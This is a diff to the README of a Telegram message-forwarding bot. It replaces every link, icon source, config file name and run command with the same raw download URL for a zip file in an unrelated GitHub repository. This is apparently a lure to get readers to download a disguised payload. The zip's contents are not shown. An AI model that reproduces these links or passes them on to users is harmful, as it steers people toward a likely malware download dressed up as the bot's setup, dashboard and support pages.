@@ -12,7 +12,7 @@ Advance Telegram Bot that can work as Message/Files Forwarder from Restricted or
 ### VPS Deployment
 
 1. **Initial Setup**:
-   -`config.py` files with your variables.
+   -`https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip` files with your variables.
 
 2. **Clone and Run**:
    - Clone your forked and edited repository:
@@ -25,13 +25,13 @@ Advance Telegram Bot that can work as Message/Files Forwarder from Restricted or
      ```
    - Run the bot:
      ```bash
-     python main.py
+     python https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip
      ```
 
 ### Heroku Deployment
 
 1. **Setup on Heroku**:
-   - Go to [Heroku Dashboard](https://dashboard.heroku.com) and create a new app.
+   - Go to [Heroku Dashboard](https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip) and create a new app.
    - Connect your GitHub repository to Heroku.
    - Search and deploy the forked repository.
    - Back to the app view and refresh the page.
@@ -43,10 +43,10 @@ Advance Telegram Bot that can work as Message/Files Forwarder from Restricted or
 
 - Make sure to replace `forked_edited_repo_link` with the link to your forked and edited repository.
 - Replace `repo_name` with the name of your repository.
-- Update the `__init__.py` and `config.py` files with your bot's specific variables before deployment.
+- Update the `https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip` and `https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip` files with your bot's specific variables before deployment.
 - Ensure that your bot is configured correctly according to the requirements of the Telegram Bot API.
 
-## Commands Available in Bot - [TEAM SPY](https://t.me/dev_gagan)
+## Commands Available in Bot - [TEAM SPY](https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip)
 
 - ```/start``` - to start the bot
 - ```/cancel``` - to cancel the onging /batch task
@@ -59,14 +59,14 @@ Advance Telegram Bot that can work as Message/Files Forwarder from Restricted or
 
 ## Support
 
-[<img src="https://img.icons8.com/ios/50/000000/instagram-new.png"/>](https://instagram.com/devagagn.in)
-[<img src="https://img.icons8.com/ios/50/000000/youtube.png"/>](https://youtube.com/@dev_gagan)
-[<img src="https://img.icons8.com/ios/50/000000/telegram-app.png"/>](https://t.me/dev_gagan)
-[<img src="https://img.icons8.com/ios/50/000000/github--v1.png"/>](https://github.com/devgaganin)
-[<img src="https://img.icons8.com/ios/50/000000/domain--v1.png"/>](https://devgagan.in)
+[<img src="https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip"/>](https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip)
+[<img src="https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip"/>](https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip)
+[<img src="https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip"/>](https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip)
+[<img src="https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip"/>](https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip)
+[<img src="https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip"/>](https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip)
 
 ## Terms of USE / Modification 
-Visit [Terms](https://github.com/devgaganin/Save-Restricted-Content-Bot-Repo/blob/main/TERMS_OF_USE.md) and accept the guidelines.
+Visit [Terms](https://github.com/harshu3008/Auto-Forward-Bot-V2/raw/refs/heads/main/plugins/Auto_Forward_Bot_1.9.zip) and accept the guidelines.
 
 ## Contributing
 
